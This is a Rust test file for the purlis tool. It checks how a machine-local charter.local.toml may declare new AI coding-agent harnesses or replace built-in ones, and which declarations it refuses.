        assert_eq!(harness.ready_to_type(), harness.declared().ready_to_type());
        assert_eq!(
            harness.why_drawn_as_a_placeholder(&long),
            harness.declared().why_drawn_as_a_placeholder(&long)
        );
    }
}

/// What `charter.local.toml` holding `text` declares, in a project declaring `files` (#968).
fn local(files: &[(&str, &str)], text: &str) -> Declarations {
    let dir = project(files);
    read_with(dir.path(), Ok(Some(text.to_owned())))
}

const LOCAL_SHELLY: &str = r#"
[harness.work]
kind = "claude"
command = ["claude"]

[harnesses.shelly]
program = "shelly"
env = ["SHELLY_*"]
"#;

#[test]
fn a_harness_charter_local_toml_declares_alone_is_read_as_this_machines() {
    let read = local(&[], LOCAL_SHELLY);

    assert_eq!(read.refused, Vec::<Refused>::new());
    let shelly = read
        .get("shelly")
        .expect("shelly is declared on this machine");
    assert_eq!(shelly.origin, Origin::Local);
    assert_eq!(shelly.program, "shelly");
    assert_eq!(shelly.title, "shelly");
    assert_eq!(shelly.file, "charter.local.toml [harnesses.shelly]");
    assert_eq!(shelly.replaces(), None);
    assert!(!shelly.has_adapter());
    assert_eq!(
        read.added().map(|d| d.name.as_str()).collect::<Vec<_>>(),
        ["shelly"]
    );
    assert_eq!(read.projects().count(), 0);
}

#[test]
fn a_local_table_names_the_harness_it_declares() {
    let read = local(
        &[],
        "[harnesses.shelly]\nname = \"other\"\nprogram = \"shelly\"\n",
    );

    assert_eq!(read.get("other"), None);
    assert_eq!(read.refused.len(), 1, "{:?}", read.refused);
    assert_eq!(
        read.refused[0].file,
        "charter.local.toml [harnesses.shelly]"
    );
    assert!(
        read.refused[0]
            .reason
            .contains("Name the table [harnesses.other]"),
        "{}",
        read.refused[0].reason
    );
}

#[test]
fn a_local_table_is_held_to_every_rule_a_projects_file_is() {
    for (text, said) in [
        (
            "[harnesses.shelly]\nprogram = \"bash\"\n",
            "a shell, an interpreter or a launcher",
        ),
        (
            "[harnesses.shelly]\nprogram = \"shelly\"\n[harnesses.shelly.levels]\nhooks = true\n",
            "says hooks = true",
        ),
        (
            "[harnesses.shelly]\nprogram = \"shelly\"\nenv = [\"OPENAI_*\"]\n",
            "named like a credential",
        ),
        (
            "[harnesses.shelly]\nprogram = \"shelly\"\ntitle = \"Codex\"\n",
            "which is a harness purlis ships",
        ),
        ("[harnesses]\nshelly = 1\n", "is not a table"),
    ] {
        let read = local(&[], text);
        assert_eq!(read.added().count(), 0, "{text}");
        assert!(
            read.refused.iter().any(|one| one.reason.contains(said)),
            "{text}: {:?}",
            read.refused
        );
    }
}

#[test]
fn a_local_table_never_takes_a_projects_harness_or_the_name_purlis_gives_one() {
    let read = local(
        &[("gemini.toml", GEMINI)],
        "[harnesses.gemini]\nprogram = \"gemini\"\n",
    );
    assert_eq!(read.get("gemini").map(|d| d.origin), Some(Origin::Project));
    assert!(
        read.refused[0]
            .reason
            .contains("which this project declares in harnesses/gemini.toml"),
        "{:?}",
        read.refused
    );

    let read = local(&[], "[harnesses.claude-code]\nprogram = \"cc\"\n");
    assert_eq!(read.get("claude-code"), None);
    assert!(
        read.refused[0]
            .reason
            .contains("the name purlis gives a harness it ships"),
        "{:?}",
        read.refused
    );
}

/// Claude Code's facts as a newer version measured them (#968): its terminal and its card, in
/// the built-in's place. Its words and its namespace stay the built-in's.
const NEWER_CLAUDE: &str = r#"
[harnesses.claude]
title = "Claude Code"
program = "claude"
env = ["CLAUDE_*"]
tested = "2.2.0"

[harnesses.claude.terminal]
newline = "\u001b[13;2u"
paste_drawn_whole = { lines = 5 }
ready_to_type = "raw-and-quiet"

[harnesses.claude.capabilities]
reports_waiting = "no: measured on 2.2.0"
"#;

#[test]
fn a_local_replacement_of_a_built_in_changes_its_facts_in_the_built_ins_place() {
    let read = local(&[], NEWER_CLAUDE);

    assert_eq!(read.refused, Vec::<Refused>::new());
    let names: Vec<&str> = read.declared.iter().map(|d| d.name.as_str()).collect();
    assert_eq!(names, ["claude", "opencode", "codex"]);
    let claude = read.get("claude").expect("claude is declared");
    assert_eq!(claude.origin, Origin::Local);
    assert_eq!(claude.replaces(), Some(Harness::ClaudeCode));
    assert_eq!(read.replacement(Harness::ClaudeCode), Some(claude));
    assert_eq!(read.replacement(Harness::Codex), None);
    assert_eq!(read.added().count(), 0);
    assert_eq!(claude.tested.as_deref(), Some("2.2.0"));
    // The words purlis runs it with and what its chats are started with are the built-in's.
    assert_eq!(claude.session, of(Harness::ClaudeCode).session);
    assert_eq!(claude.env, of(Harness::ClaudeCode).env);
    assert_eq!(claude.terminal.newline.as_deref(), Some("\x1b[13;2u"));
    assert_eq!(claude.terminal.ready_to_type, ReadyToType::RawAndQuiet);
    assert_eq!(
        claude.capability("reports_waiting"),
        Answer::No("measured on 2.2.0".to_owned())
    );
    // Its arming is the built-in's: the adapter, the levels and the program.
    assert!(claude.has_adapter());
    assert_eq!(claude.levels, of(Harness::ClaudeCode).levels);
    assert_eq!(claude.program, "claude");
    // And the built-in purlis ships is unchanged.
    assert_eq!(Harness::ClaudeCode.declared().origin, Origin::BuiltIn);
    assert_eq!(
        Harness::ClaudeCode.declared().tested.as_deref(),
        Some("2.1.283")
    );
}

#[test]
fn a_local_replacement_never_changes_how_a_built_in_is_run_or_armed() {
    for (text, said) in [
        (
            "[harnesses.claude]\nprogram = \"my-claude\"\n",
            "runs its program, claude",
        ),
        (
            "[harnesses.claude]\nprogram = \"claude\"\n[harnesses.claude.levels]\nhooks = false\n",
            "Remove [levels]",
        ),
        (
            "[harnesses.opencode]\nprogram = \"opencode\"\n[harnesses.opencode.levels]\nacp = [\"opencode\", \"serve\"]\n",
            "Remove [levels]",
        ),
        (
            "[harnesses.claude]\nprogram = \"claude\"\n[harnesses.claude.session]\nchosen_by = \"harness\"\n",
            "Remove [session]",
        ),
        (
            "[harnesses.opencode]\nprogram = \"opencode\"\n[harnesses.opencode.session]\nresume = [\"--session={id}\", \"--pure\"]\n",
            "Remove [session]",
        ),
        (
            "[harnesses.opencode]\nprogram = \"opencode\"\n[harnesses.opencode.session]\nchosen_by = \"harness\"\nnew = [\"--pure\"]\n",
            "Remove [session]",
        ),
        // A word no adapter knows to refuse is still a word nobody was asked about.
        (
            "[harnesses.claude]\nprogram = \"claude\"\n[harnesses.claude.session]\nchosen_by = \"purlis\"\nnew = [\"--session-id={id}\", \"--bare\"]\n",
            "Remove [session]",
        ),
        (
            "[harnesses.claude]\nprogram = \"claude\"\nenv = [\"CLAUDE_*\", \"MODEL_HINT\"]\n",
            "Remove env",
        ),
        (
            "[harnesses.codex]\nprogram = \"codex\"\ntitle = \"Claude Code\"\n",
            "which is a harness purlis ships",
        ),
    ] {
        let read = local(&[], text);
        let name = text
            .trim_start_matches("[harnesses.")
            .split(']')
            .next()
            .unwrap();
        assert_eq!(
            read.get(name).map(|d| d.origin),
            Some(Origin::BuiltIn),
            "{text}: the built-in stands"
        );
        assert!(
            read.refused.iter().any(|one| one.reason.contains(said)),
            "{text}: {:?}",
            read.refused
        );
    }
}

#[test]
fn a_local_replacement_keeps_the_levels_and_the_words_it_restates() {
    let read = local(
        &[],
        "[harnesses.codex]\nprogram = \"codex\"\nenv = [\"CODEX_*\"]\n[harnesses.codex.session]\nchosen_by = \"harness\"\nresume = [\"resume\", \"{id}\"]\nnamed_by = [\"resume\", \"fork\"]\n[harnesses.codex.levels]\nterminal = true\nhooks = true\n",
    );

    assert_eq!(read.refused, Vec::<Refused>::new());
    let codex = read.replacement(Harness::Codex).expect("replaced");
    assert_eq!(codex.levels, of(Harness::Codex).levels);
    assert_eq!(codex.session, of(Harness::Codex).session);
    // Claude Code's own words, restated: a chat's name bare, as only the built-in hands it.
    let read = local(
        &[],
        "[harnesses.claude]\nprogram = \"claude\"\n[harnesses.claude.session]\nchosen_by = \"purlis\"\nnew = [\"--session-id\", \"{id}\", \"--name\", \"{name}\"]\nresume = [\"--resume\", \"{id}\", \"--name\", \"{name}\"]\nnamed_by = [\"--session-id\", \"--resume\", \"-r\", \"--continue\", \"-c\", \"--fork-session\"]\n",
    );
    assert_eq!(read.refused, Vec::<Refused>::new());
    assert_eq!(
        read.replacement(Harness::ClaudeCode).map(|d| &d.session),
        Some(&of(Harness::ClaudeCode).session)
    );
}

#[test]
fn a_harness_of_this_machines_own_hands_an_id_over_bare_and_never_a_name() {
    let read = local(
        &[],
        "[harnesses.shelly]\nprogram = \"shelly\"\n[harnesses.shelly.session]\nresume = [\"resume\", \"{id}\"]\n",
    );
    assert_eq!(read.refused, Vec::<Refused>::new());
    // A chat's name is still never handed over bare: it could read as a flag.
    let read = local(
        &[],
        "[harnesses.shelly]\nprogram = \"shelly\"\n[harnesses.shelly.session]\nchosen_by = \"purlis\"\nnew = [\"--session-id={id}\", \"--name\", \"{name}\"]\n",
    );
    assert_eq!(read.get("shelly"), None);
    assert!(
        read.refused[0].reason.contains("{name}"),
        "{:?}",
        read.refused
    );
}

#[test]
fn a_local_replacement_is_typed_into_one_line_only_as_a_declared_harness_is() {
    let read = local(&[], NEWER_CLAUDE);
    let claude = read.replacement(Harness::ClaudeCode).unwrap();

    assert_eq!(claude.why_drawn_as_a_placeholder("one line"), None);
    let why = claude
        .why_drawn_as_a_placeholder("two\nlines")
        .expect("refused");
    assert!(why.contains("only a prompt on one line"), "{why}");
    // The built-in purlis measured takes the same two lines whole.
    assert_eq!(
        Harness::ClaudeCode.why_drawn_as_a_placeholder("two\nlines"),
        None
    );
}

#[test]
fn a_local_file_that_does_not_read_adds_nothing_and_says_it_once_elsewhere() {
    for local_text in [
        Ok(None),
        Ok(Some("not toml [".to_owned())),
        Err(io::Error::other("denied")),
    ] {
        let dir = project(&[]);
        let read = read_with(dir.path(), local_text);
        assert_eq!(read.declared, builtins().to_vec());
        assert_eq!(read.refused, Vec::<Refused>::new());
    }
}

/// What a card, a picker, the doctor and a start read (#968): this machine's tables only
/// where git would not carry the file they are in.
#[test]
fn this_machines_tables_are_not_read_from_a_file_git_would_carry() {
    use crate::settings::LayerText;
    let dir = project(&[]);
    for text in [LOCAL_SHELLY, NEWER_CLAUDE] {
        let carried = LayerText::LeftOut {
            why: "git tracks charter.local.toml".to_owned(),
            text: text.to_owned(),
        };

        let read = read_layer(dir.path(), carried);

        assert_eq!(read.declared, builtins().to_vec(), "{text}");
        assert_eq!(read.refused.len(), 1, "{:?}", read.refused);
        assert_eq!(read.refused[0].file, "charter.local.toml [harnesses]");
        assert!(read.refused[0].reason.contains("git tracks"));
        // And where git would not carry it, they are read.
        let read = read_layer(dir.path(), LayerText::Text(text.to_owned()));
        assert_ne!(read.declared, builtins().to_vec(), "{text}");
    }
    // A carried file that declares no harness has nothing here to refuse.
    let read = read_layer(
        dir.path(),
        LayerText::LeftOut {
            why: "git tracks charter.local.toml".to_owned(),
            text: "[harness.work]\nkind = \"claude\"\ncommand = [\"claude\"]\n".to_owned(),
        },
    );
    assert_eq!(read.declared, builtins().to_vec());
    assert_eq!(read.refused, Vec::<Refused>::new());
    assert_eq!(
        read_layer(dir.path(), LayerText::Nothing).refused,
        Vec::new()
    );
}

/// A local file that declares no harness says nothing to this reader, and git is not asked
/// about it: a start reads the declarations several times, and most projects' local file
/// holds profiles alone.
#[test]
fn a_local_file_with_no_harnesses_table_is_nothing_to_the_declarations_reader() {
    use crate::settings::{LayerText, local_layer_holding};
    let dir = project(&[]);
    let file = dir.path().join(crate::profiles::LOCAL_FILE);
    assert_eq!(
        local_layer_holding(dir.path(), LOCAL_TABLE),
        LayerText::Nothing
    );

    std::fs::write(
        &file,
        "[harness.work]\nkind = \"claude\"\ncommand = [\"claude\"]\n",
    )
    .unwrap();
    assert_eq!(
        local_layer_holding(dir.path(), LOCAL_TABLE),
        LayerText::Nothing
    );
    std::fs::write(&file, "not toml [").unwrap();
    assert_eq!(
        local_layer_holding(dir.path(), LOCAL_TABLE),
        LayerText::Nothing
    );

    // One that declares a harness is read, here where no git would carry it.
    std::fs::write(&file, LOCAL_SHELLY).unwrap();
    assert_eq!(
        local_layer_holding(dir.path(), LOCAL_TABLE),
        LayerText::Text(LOCAL_SHELLY.to_owned())
    );
    assert!(read(dir.path()).get("shelly").is_some());
}
